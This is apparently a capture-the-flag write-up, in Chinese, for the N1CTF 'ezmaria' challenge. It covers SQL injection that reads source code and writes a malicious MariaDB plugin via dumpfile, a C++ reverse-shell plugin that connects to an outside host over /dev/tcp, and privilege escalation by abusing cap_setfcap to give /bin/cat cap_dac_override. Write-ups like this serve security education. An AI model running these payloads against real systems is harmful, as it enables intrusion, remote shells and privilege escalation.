# N1CTF ezmaria writeup
- 第一步  
    尝试用load_file读取源码
    ```
    id=0 union select 1, load_file('/var/www/html/index.php')
    ```
    发现`if ($_REQUEST["secret"] === "lolita_love_you_forever")`会执行一些命令，ps的结果
    ```
    mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql
    ```
    可以看到mysql的plugin目录是`/mysql/plugin`以及`secure-file-priv`是空的，过滤了outfile但没有过滤dumpfile，而且使用的是multi_query，可以进行堆叠注入  

- 第二步  
    写插件并且加载，反弹shell  
    恢复mysql的表，因为用skip-grant-tables启动
    ```
    CREATE DATABASE IF NOT EXISTS mysql;
    use mysql;
    CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment='MySQL plugins';
    ```
    编写插件
    ```
    #include <stdlib.h>
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    void lshell(){
        
        system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1 &'");
    }
    class LOLITA {
    public:
        LOLITA(){
            lshell();
        }
    };
    LOLITA lolita;
    LOLITA* _mysql_plugin_interface_version_ = &lolita;
    //compile: g++ expso.cpp -shared -fPIC -o exp.so
    ```
    将编译出来的so文件用dumpfile写到/mysql/plugin/目录
    ```
    f = open("exp.so", 'rb')
    xid = "1; select unhex('" + ''.join(['%02X' % b for b in bytes(f.read())]) + "') into dumpfile '/mysql/plugin/lolita.so';"
    res = requests.post(url, data={
        "id": xid
    })
    print(res.text)
    ```
    最后安装插件反弹shell  
    ```INSTALL PLUGIN plugin_name SONAME 'lolita.so'```

- 第三步  
    可以看到/flag没有权限读取，找suid和cap
    ```
    find / -user root -perm -4000 -print 2>/dev/null
    getcap -r / 2>/dev/null

    /usr/bin/mariadb cap_setfcap=ep
    ```
    可以看到/usr/bin/mariadb有cap_setfcap权限
    参考`https://blog.csdn.net/xdy762024688/article/details/132237969`  
    也就是我们能给其他文件设置cap  
    给mariadb写个插件
    ```
    #include <stdlib.h>
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/capability.h>


    void lshell(){
        cap_t caps = cap_from_text("cap_dac_override=eip");
        cap_set_file("/bin/cat", caps);
        printf("setcap finished\n");
    }

    class LOLITA {
    public:
        LOLITA(){
            lshell();
        }
    };
    LOLITA _mysql_client_plugin_declaration_;
    //compile: g++ expcap.cpp -shared -fPIC -o cap.so -lcap2
    ```
    将编译出来的文件传到靶机（dd < /dev/tcp/ip/port > cap.so）  
    加载这个so让/bin/cat获取cap_dac_override（忽略文件权限）的特权  
    ```
    mariadb --plugin-dir=. --default-auth=cap
    cat /flag
    ```

- 赛后总结  
    hint没放好，`skip-grant-tables`这一步很容易想不到，最后还是有8个队伍做出来了  
    